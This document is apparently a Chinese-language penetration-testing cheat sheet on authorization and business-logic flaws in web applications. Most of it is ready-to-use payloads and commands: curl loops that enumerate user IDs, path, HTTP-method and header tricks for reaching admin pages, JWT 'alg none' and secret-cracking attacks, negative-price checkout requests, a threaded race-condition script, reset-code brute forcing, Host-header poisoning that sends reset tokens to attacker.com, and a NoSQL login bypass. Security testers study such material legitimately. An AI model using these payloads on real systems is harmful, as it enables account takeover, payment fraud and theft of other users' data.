# 越权与逻辑漏洞实战参考
- 竞争条件绕过业务逻辑 → `web-race-condition.md`

> 分类: IDOR → 垂直越权 → 水平越权 → 支付逻辑 → 密码重置 → 会话管理 → API鉴权

> **last_updated**: 2026-06-04 | **tested_against**: JWT, OAuth 2.0, Session, REST API
---

## 1. IDOR (不安全的直接对象引用)

### 1.1 检测方法

```
典型场景:
- /api/user/123/profile          → 改 123 为 124
- /invoice?id=INV-2024-0001      → 递增/递减ID
- /download?file=report_123.pdf  → 改成其他文件名
- /api/order/456/detail          → 遍历订单号

检测步骤:
1. 用账户A登录, 访问自己的资源, 记录请求
2. 用账户B登录, 执行同样操作, 对比两组的ID/Token模式
3. 用账户A的Cookie/Token, 请求账户B的资源ID
4. 如果有加密的ID (hash/token) → 尝试解码/猜测生成算法
```

### 1.2 IDOR 常见参数名

```
id= / uid= / user_id= / userId=
order_id= / invoice_id= / transaction_id=
file= / file_id= / document_id=
profile= / account= / customer=
uuid= / guid= / hash=
```

### 1.3 利用

```bash
# === 基础遍历 ===
for i in $(seq 1 100); do
  curl -s -H "Cookie: session=xxx" "https://target.com/api/user/$i/profile" | grep email
done

# === UUID 枚举 (如果是可预测的UUIDv1/v3) ===
# UUIDv1 含 MAC 地址 + 时间戳 → 可枚举
# 工具: https://github.com/ramsey/uuid (分析UUID版本)

# === 批量检测 ===
# Burp Intruder: 数字/日期/GUID payload → 按响应长度分类
```

---

## 2. 垂直越权 (权限提升)

### 2.1 检测点

```
普通用户访问管理功能:
- /admin /administrator /manage /dashboard
- /api/admin/users
- /api/config
- /actuator (Spring Boot)

未登录访问需认证的接口:
- 直接访问 → 看是否返回 401/403
- 删除/修改 Cookie/Token → 看是否有校验
```

### 2.2 绕过技巧

```bash
# === 路径变形 ===
/admin/users → /Admin/users → /admin/Users
/admin → /ADMIN → /%61dmin
/admin/../admin/users → //admin/users
/admin;/users → /admin/users/

# === HTTP 方法绕过 ===
GET  /admin/users    → 403 Forbidden
POST /admin/users    → 200 OK
PUT  /admin/users    → 200 OK
PATCH /admin/users   → 200 OK

# === Header 绕过 ===
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-HTTP-Method-Override: GET
X-Forwarded-For: 127.0.0.1

# === 角色参数 ===
GET /api/user/profile?role=admin
PATCH /api/user/123 {"role":"admin"}
POST /api/register {"username":"test","role":"admin"}
```

### 2.3 JWT 角色篡改

```bash
# JWT payload 含角色:
{"sub":"user123","role":"user"}

# 尝试:
1. 改为 {"sub":"user123","role":"admin"} → 不验签? → 直接越权
2. algorithm: none 攻击:
   {"alg":"none","typ":"JWT"}
   # Header + Payload Base64后, Signature留空
3. 密钥爆破 (HS256弱密钥) → 用 jwt_tool / hashcat
```

---

## 3. 水平越权 (跨用户)

### 3.1 检测

```
# 账户A的Cookie, 访问账户B的资源
curl -H "Authorization: Bearer <TOKEN_A>" "https://target.com/api/user/B_ID/profile"
curl -H "Cookie: session=<SESSION_A>" "https://target.com/api/orders?user_id=B_ID"
```

### 3.2 常见模式

```bash
# === GUID/UUID 不可预测 → 盲猜/从其他接口泄露 ===
# 用户ID从 /api/user/profile 返回 → 改ID访问 /api/user/{id}/orders

# === ID 有规律 ===
# MD5(email) → 计算目标的 email hash → 访问

# === 批量利用 ===
# 用搜索引擎/其他公开页面收集ID → 批量访问敏感接口
```

---

## 4. 支付/交易逻辑漏洞

### 4.1 金额篡改

```http
POST /api/checkout HTTP/1.1

# 原始:
{"product_id":123,"quantity":1,"price":99.99}

# 尝试:
{"product_id":123,"quantity":1,"price":0.01}       # 改价格
{"product_id":123,"quantity":-1,"price":99.99}      # 负数量 → 退钱
{"product_id":123,"quantity":1,"price":-99.99}      # 负价格 → 账户加钱
```

### 4.2 优惠券/折扣滥用

```http
# 优惠码叠加/重复使用
POST /api/apply-coupon
{"code":"NEWUSER50"}           # → 使用多次

# 负数折扣
{"code":"NEWUSER50","amount":-50}

# 高比例折扣叠加
{"code":"NEWUSER10","code":"VIP20","code":"SALE30"}
```

### 4.3 竞态条件

```bash
# 余额/库存竞态
# 初始余额: 100元
# 同时发起多个 100元提现请求 → 余额检查都通过 → 提现200元

# Burp Intruder / Turbo Intruder:
# 20并发请求 → 看是否都成功

# Python 并发验证:
import threading, requests
def checkout():
    s = requests.Session()
    s.post("https://target.com/api/checkout", json={"product_id":1,"quantity":1})
for i in range(20):
    threading.Thread(target=checkout).start()
```

---

## 5. 密码重置漏洞

### 5.1 验证码爆破

```bash
# 4位/6位验证码 → 爆破
POST /api/verify-reset-code
{"phone":"13800138000","code":"0000"} → ... → "9999"

# Burp Intruder: Numbers payload, 0000-9999
# 注意: 通常有频率限制 + 次数限制(5次)
```

### 5.2 Token 泄露/可预测

```
Token 在响应中返回:
GET /api/reset-password?phone=13800138000
→ {"token":"abc123"}   ← 直接在响应里

Token 在 Referer 中:
POST /api/reset-password
Referer: https://target.com/reset?token=abc123

Token 可预测:
- 基于时间戳: new Date().getTime()
- 基于用户名: MD5(username)
- 基于递增ID: 001 → 002 → 003
```

### 5.3 任意用户密码重置

```http
# 修改手机号/邮箱参数
POST /api/reset-password
{"phone":"13800138000","new_password":"hacked123"}

# 尝试加目标用户标识:
{"user_id":1,"phone":"13800138000","new_password":"hacked123"}
{"target_user":"admin","phone":"13800138000","new_password":"hacked123"}

# Host 头投毒 → 重置链接发到攻击者服务器
POST /api/forgot-password
Host: attacker.com
{"email":"admin@target.com"}
→ 目标收到链接: https://attacker.com/reset?token=xxx
```

---

## 6. 会话管理漏洞

### 6.1 Session Fixation

```
1. 访问目标站 → 获取 Session ID: abc123
2. 构造链接: https://target.com/login?PHPSESSID=abc123
3. 发给受害者 → 受害者用此链接登录
4. 攻击者用 Session ID abc123 → 直接以受害者身份登录
```

### 6.2 Token 未失效

```bash
# 登出后 Token 仍有效
# 1. 登录 → 获取 JWT
# 2. 登出
# 3. 用旧 JWT 访问 → 200 OK → Token 未失效

# 密码修改后 Token 仍有效
# 1. 登录 → 获取 Token
# 2. 修改密码
# 3. 旧 Token 仍然可访问 → Token 未失效
```

### 6.3 弱 Token 生成

```
JWT secret: "secret" / "password" / "changeme"
→ jwt_tool 爆破

Session ID 可预测:
- 基于 base64(username+timestamp) → 计算他人 session
- 基于递增序列 → 遍历

# jwt_tool:
python3 jwt_tool.py <JWT> -C -d rockyou.txt
```

---

## 7. API 鉴权绕过

### 7.1 常见模式

```bash
# === 参数覆盖 ===
POST /api/user/profile
{"user":"attacker"}
&user=admin    → 后端可能取最后一个参数

# === 数组注入 ===
{"role":["user","admin"]}     → 后端取 role[0] 但校验 role
{"role":"user","role":"admin"} → PHP 只取最后一个 = admin

# === NoSQL 注入鉴权 ===
POST /api/login
{"username":{"$ne":null},"password":{"$ne":null}}
# MongoDB → 匹配任意用户

# === GraphQL 内省 → 发现隐藏接口 ===
POST /graphql
{"query":"{ __schema { types { name fields { name } } } }"}
```

### 7.2 Mass Assignment (批量赋值)

```http
POST /api/register HTTP/1.1

# 原始:
{"username":"test","password":"test123"}

# 尝试注入额外字段:
{"username":"test","password":"test123","isAdmin":true}
{"username":"test","password":"test123","role":"admin"}
{"username":"test","password":"test123","approved":true}
{"username":"test","password":"test123","email_verified":true}
```

---
## 相关参考
- 竞争条件绕过业务逻辑 → `web-race-condition.md`

*参考: OWASP IDOR + PortSwigger Access Control + 实战案例*
